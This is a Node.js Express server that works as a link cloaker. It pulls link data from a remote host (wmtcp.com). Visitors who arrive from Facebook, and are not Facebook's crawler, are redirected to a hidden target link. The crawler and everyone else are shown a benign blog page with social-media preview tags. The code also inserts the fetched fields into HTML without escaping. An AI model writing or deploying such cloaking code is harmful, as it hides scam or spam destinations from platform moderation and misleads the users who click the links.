import express from 'express';
import fetch from 'node-fetch';
const app = express();
const port = 3000;  // Bạn có thể chọn bất kỳ cổng nào không bị xung đột

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Welcome</title><style>body {font-family: 'Arial', sans-serif;background-color: #f4f4f9;margin: 0;padding: 0;display: flex;justify-content: center;align-items: center;height: 100vh;color: #333;}h1 {font-size: 48px;margin: 0;}p {font-size: 24px;color: #555;}.container {text-align: center;box-shadow: 0 4px 8px rgba(0,0,0,0.1);padding: 50px;background: white;border-radius: 10px;}</style></head><body><div class="container"><h1>Hello World!</h1><p>Every mile starts with the first steps</p><p style="font-size:small">Mr. T</p></div></body></html>`);
});

app.get('/:code', async (req, res) => {
    const referer = req.headers.referer || '';
    const userAgent = req.headers['user-agent'] || '';  // Đảm bảo rằng userAgent được xác định
    const code = req.params.code;
    const url = `https://wmtcp.com/link/${code}.json`; // Địa chỉ của server khác

    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.json();
        const currentUrl = `${req.protocol}://${req.get('host')}${req.originalUrl}`;

        if ((referer.includes('facebook.com') || referer.includes('m.facebook.com') || referer.includes('l.facebook.com')) &&
            !userAgent.includes('facebookexternalhit')) {
            res.redirect(data.link);
        } else {
            res.send(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.title}</title>
    <meta name="description" content="${data.des}">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="article">
    <meta property="og:url" content="${currentUrl}">
    <meta property="og:title" content="${data.title}">
    <meta property="og:description" content="${data.des}">
    <meta property="og:image" content="${data.image}">

    <!-- Twitter -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:url" content="${currentUrl}">
    <meta name="twitter:title" content="${data.title}">
    <meta name="twitter:description" content="${data.des}">
    <meta name="twitter:image" content="${data.image}">

    <!-- Additional tags for extra SEO points and accessibility -->
    <link rel="canonical" href="${currentUrl}">
    <meta name="robots" content="index, follow">
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-L4XK2P5PBL"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-L4XK2P5PBL');
</script>
</head>
<body>
    <header>
        <h1>${data.title}</h1>
    </header>
    <article>
        <p>${data.des}</p>
        <img src="${data.image}" style="width: 100%; max-width: 600px;">
    </article>
    <footer>
        <p>Blog Love T</p>
    </footer>
</body>
</html>
`);
        }
    } catch (error) {
        console.error('Error fetching data:', error);
        res.status(500).send(`An error occurred while fetching data: ${error.message}`);
    }
});


app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`);
});
